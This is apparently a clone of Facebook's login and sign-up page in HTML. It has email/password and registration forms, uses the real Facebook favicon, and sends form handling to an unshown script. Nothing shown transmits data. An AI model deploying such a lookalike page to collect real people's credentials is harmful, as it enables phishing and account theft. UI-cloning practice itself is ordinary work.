<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook â€“ log in or sign up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="facebook-page">
            <div class="text">
                <h1>facebook</h1>
                <p>Connect with friends and the world around you on Facebook.</p>
            </div>
            <div class="form-container">
                <form id="loginForm" class="login-form">
                    <div class="error-message" id="errorMessage"></div>
                    <input type="email" id="email" placeholder="Email or phone number" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                    <a href="#" class="forgot-password">Forgot password?</a>
                    <hr>
                    <button type="button" class="create-account-btn" id="createAccountBtn">
                        Create new account
                    </button>
                </form>
            </div>
        </div>
    </div>

    <div id="signupModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Sign Up</h2>
                <span class="close" id="closeModalBtn">&times;</span>
            </div>
            <p>It's quick and easy.</p>
            <form id="signupForm">
                <div class="error-message" id="signupErrorMessage"></div>
                <div class="name-row">
                    <input type="text" id="firstName" placeholder="First name" required>
                    <input type="text" id="lastName" placeholder="Last name" required>
                </div>
                <input type="email" id="signupEmail" placeholder="Email" required>
                <input type="password" id="signupPassword" placeholder="New password" required>
                
                <label>Birthday</label>
                <div class="birthday-row">
                    <select id="month" required>
                        <option value="">Month</option>
                        <option value="1">Jan</option>
                        <option value="2">Feb</option>
                        <option value="3">Mar</option>
                        <option value="4">Apr</option>
                        <option value="5">May</option>
                        <option value="6">Jun</option>
                        <option value="7">Jul</option>
                        <option value="8">Aug</option>
                        <option value="9">Sep</option>
                        <option value="10">Oct</option>
                        <option value="11">Nov</option>
                        <option value="12">Dec</option>
                    </select>
                    <select id="day" required>
                        <option value="">Day</option>
                    </select>
                    <select id="year" required>
                        <option value="">Year</option>
                    </select>
                </div>
                
                <label>Gender</label>
                <div class="gender-row">
                    <label class="gender-option">
                        <input type="radio" name="gender" value="female" required>
                        Female
                    </label>
                    <label class="gender-option">
                        <input type="radio" name="gender" value="male" required>
                        Male
                    </label>
                    <label class="gender-option">
                        <input type="radio" name="gender" value="other" required>
                        Custom
                    </label>
                </div>
                
                <button type="submit" class="signup-btn">Sign Up</button>
            </form>
        </div>
    </div>

    <div id="successMessage" class="success-message"></div>
    <script src="script.js"></script>
</body>
</html>
